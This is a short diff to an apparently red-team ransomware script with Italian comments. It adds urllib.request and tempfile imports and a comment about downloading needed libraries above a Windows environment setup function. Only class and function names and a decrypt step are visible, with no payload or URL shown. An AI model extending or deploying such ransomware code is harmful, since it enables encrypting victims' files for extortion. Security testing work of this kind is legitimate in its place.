@@ -11,6 +11,8 @@ import uuid
 import argparse
 import sys
 import importlib.util
+import urllib.request
+import tempfile
 
 # ========== CONFIGURAZIONE GLOBALE ==========
 # ⚠️ MODIFICA QUESTE VARIABILI PER CONFIGURARE IL RANSOMWARE ⚠️
@@ -234,6 +236,7 @@ class RedTeamRansomware:
         decrypted_count = self.decrypt_files()
         print(f"Decrypted: {decrypted_count} files")
 
+# Scarica tutte le librerie necessarie
 def setup_windows_environment(skip_vcredist=False, verbose=False):
     """
     Configura automaticamente l'ambiente Windows installando le dipendenze mancanti.
